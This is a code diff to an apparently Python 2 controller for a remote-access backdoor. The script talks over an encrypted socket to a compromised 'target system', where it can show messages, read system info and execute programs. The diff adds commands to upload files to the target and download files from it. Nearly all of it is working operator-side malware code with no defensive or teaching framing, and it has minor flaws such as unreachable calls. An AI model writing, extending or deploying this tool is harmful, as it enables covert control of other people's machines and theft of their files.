@@ -8,6 +8,8 @@
 [~] Version: 0.2
 """
 
+END_OF_FILE = "(((END_OF_FILE)))"
+
 import socket
 import os
 import sys
@@ -31,12 +33,60 @@ def send(data):
     pwd = crypt(cli.recv(1024), False)
     print(crypt(cli.recv(16384), False))
 
+def upload(command):
+    fileName = command.replace("upload ", "")
+    try:
+        f = open(fileName, 'rb')
+        cli.sendall(crypt(command))
+        l = f.read(1024)
+
+        while l:
+            cli.send(l)
+            l = f.read(1024)
+        f.close()
+        cli.send(END_OF_FILE)
+        print crypt(cli.recv(1024), False)
+        menu()
+
+    except IOError:
+        print "File not found"
+
+
+def download(command):
+    cli.sendall(crypt(command))
+    fileName = command.replace("download ", "")
+    while True:
+        l = cli.recv(1024)
+
+        if l.startswith("File not found"):
+            print l 
+            menu()
+        else:
+	        f = open(fileName, 'wb')
+	        while (l):
+	            if l.endswith(END_OF_FILE):
+	                if END_OF_FILE in l:
+	                    l = l.replace(END_OF_FILE, "")
+	                f.write(l)
+	                break
+	            else:
+	                f.write(l)
+	                l = cli.recv(1024)
+
+	        print "[+] Download complete!"
+	        print "[+] %s ==> %s\n"%(fileName, os.getcwd()+os.sep+fileName)
+	        f.close()
+	        break
+	        menu()
+
 def help():
     print"""
 Commands:
+    download                : Download files from client.
+    upload                  : Upload files to client from server.
     message TEXT            : Show messages on target system.
     info()                  : Show target system's info.
-    execute PROGRAM ARGS    : Execute programs in a new process
+    execute PROGRAM ARGS    : Execute programs in a new process.
     
 Execute programs on local machine:
     :dir ==> with ":"
@@ -75,6 +125,12 @@ def menu():
                 os.system(command)
                 menu()
 
+        elif "upload" in command:
+            upload(command)
+
+        elif "download" in command:
+            download(command)
+
         elif command == "": 
             command = " "
 
@@ -85,8 +141,8 @@ def start():
         try:
             main()
             menu()
-        except:
-            start()
+        except Exception as e:
+            print e
 
 if __name__ == "__main__":
     start()
